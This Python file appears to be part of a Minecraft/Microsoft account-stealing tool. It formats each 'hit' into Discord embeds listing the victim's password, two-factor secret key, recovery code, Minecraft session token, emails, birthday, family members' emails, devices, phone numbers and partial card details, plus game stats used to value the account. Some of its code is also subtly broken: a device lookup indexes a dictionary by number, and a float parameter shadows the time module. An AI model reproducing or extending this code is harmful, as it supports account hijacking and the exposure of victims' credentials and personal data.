from minecraft.get_hypixel import get_hypixel_stats
from minecraft.get_donut import get_donut_stats
from shared.simplify import simplify

from urllib.parse import quote
from discord import Embed

async def build_account_embeds(account: dict, time: float = 0, claim_id: str = "") -> dict:
    name = quote(account["minecraft"]["name"])

    ms = account["microsoft"]
    family = ms["family"]
    devices = ms["devices"]
    cards = ms["cards"]
    subs = ms["subscriptions"]
    phones = ms["phones"]

    active_subs = [(s, "Active") for s in subs["active"]]
    canceled_subs = [(s, "Canceled") for s in subs["canceled"]]
    commercial_subs = [(s, "Commercial") for s in subs["commercial"]]

    all_subs = active_subs + canceled_subs + commercial_subs

    info_embed = Embed(title="Extra Info", color=0x5865F2)
    info_embed.add_field(name="First Name", value=f"```{ms['firstName']}```", inline=True)
    info_embed.add_field(name="Last Name", value=f"```{ms['lastName']}```", inline=True)
    info_embed.add_field(name="Full Name", value=f"```{ms['fullName']}```", inline=False)
    info_embed.add_field(name="Region", value=f"```{ms['region']}```", inline=True)
    info_embed.add_field(name="Birthday", value=f"```{ms['birthday']}```", inline=True)
    info_embed.add_field(name="Language", value=f"```{ms['language']}```", inline=True)

    family_embed = Embed(title=f"Family Members ({len(family)})", color=0x5865F2)
    if family:
        for key, member in enumerate(family, 1):
            family_embed.add_field(
                name=f"Member {key}", 
                value=f"```{member["display"]}\n{member["email"]}\nRole: {member["role"]}```", 
                inline=True
            )
    else:
        family_embed.description = "This account doesn't belong to a family."


    devices_embed = Embed(title=f"Devices ({len(devices)})", color=0x5865F2)
    if devices:
        for key, device in enumerate(devices, 1):
            devices_embed.add_field(
                name=f"Device {key}", 
                value=f"```{device[key-1]["name"]}\n{device["model"]}```",
                inline=True
            )
    else:
        devices_embed.description = "```There are no devices connected.```"

    # List all cards
    cards_embed = Embed(title=f"Payment Cards ({len(cards)})", color=0x5865F2)
    if cards:
        for key, card in enumerate(cards, 1):
            cards_embed.add_field(
                name=f"Card {key}",
                value=f"```{card["paymentMethodType"]} *{card["lastFourDigits"]}\nExpiry: {card["expirationDate"]}```",
                inline=True
            )
    else:
        cards_embed.description = "```No payment cards.```"

    phones_embed = Embed(title=f"Phones ({len(phones)})", color=0x5865F2)
    if phones:
        for key, phone in enumerate(phones, 1):
            phones_embed.add_field(
                name=f"Phone {key}",
                value=f"```{phone["phone"]}\n{phone["id"]}```",
                inline=True
            )
    else:
        phones_embed.description = "```No phones associated.```"

    subscriptions_embed = Embed(title=f"Subscriptions ({len(all_subs)})", color=0x5865F2)
    if all_subs:
        for key, (sub, status) in enumerate(all_subs, 1):
            subscriptions_embed.add_field(
                name=f"Sub {key}",
                value=f"```{sub["productName"]}\n{status}```",
                inline=True
            )
    else:
        subscriptions_embed.description = "```No subscriptions.```"

    hstats = await get_hypixel_stats(name)
    dstats = await get_donut_stats(name)

    stats_embed = Embed(color=0x279CF5)
    stats_embed.add_field(name="Rank", value=f'{hstats["hypixel"]["rank"]}', inline=True)
    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats["hypixel"]["level"])}', inline=True)
    stats_embed.add_field(name="Gifted", value=f'{hstats["hypixel"]["gifted"]}', inline=True)
    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["skyblock"]["networth"])}', inline=True)
    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["skyblock"]["level"])}', inline=True)
    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)

    xbox_embed = Embed(color=0x107C10, title="Xbox Info")
    xbox_embed.add_field(name="Gamertag", value=f"```{account['minecraft']['gamertag']}```", inline=False)

    hit_embed = Embed(
        title=f"New Hit! Secured in {round(time, 2)}s",
        description=(
            "[Login](https://login.live.com/) | "
            "[Donut](https://www.donutstats.net/player-finder) | "
            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | "
            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) | "
            f"[Is Online](https://hypixel.paniek.de/player/{name}/status)"
        ),
        color=0x279CF5
    )
    hit_embed.add_field(name="MC Username", value=f"```{account['minecraft']['name']}```", inline=False)
    hit_embed.add_field(name="MC Method", value=f"```{account['minecraft']['method']}```", inline=True)
    hit_embed.add_field(name="MC Capes", value=f"```{account['minecraft']['capes']}```", inline=True)
    hit_embed.add_field(name="Primary Email", value=f"```{ms['email']}```", inline=False)
    hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
    hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
    hit_embed.add_field(name="Secret Key", value=f"```{ms['auth_secret']}```", inline=False)
    hit_embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
    hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")

    ssid_embed = Embed(
        title="SSID"
    )
    if account["minecraft"]["SSID"]:
        ssid_embed.description = f"```{account['minecraft']['SSID'] }```"
    else:
        ssid_embed.description = "This account does not have a SSID."

    if account["minecraft"]["SSID"]:
        hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/128")

    return {
        "hit_embed": hit_embed,
        "claim_id": claim_id,
        "minecraft": account["minecraft"],
        "details": {
            "stats_embed": stats_embed,
            "ssid_embed": ssid_embed,
            "info_embed": info_embed,
            "xbox_embed": xbox_embed,
            "family_embed": family_embed,
            "devices_embed": devices_embed,
            "cards_embed": cards_embed,
            "subs_embed": subscriptions_embed,
            "phones_embed": phones_embed,
            "account_details": (
                f"**Username:** {account['minecraft']['name']}\n"
                f"**Has MC:** {True if account['minecraft']['SSID'] else False}\n"
                f"**Capes:** {account['minecraft']['capes']}\n"
                f"**Email:** {ms['email']}\n"
                f"**Security Email:** {ms['security_email']}\n"
                f"**Password:** {ms['password']}\n"
                f"**Recovery Code:** {ms['recovery_code']}"
            )
        }
    }
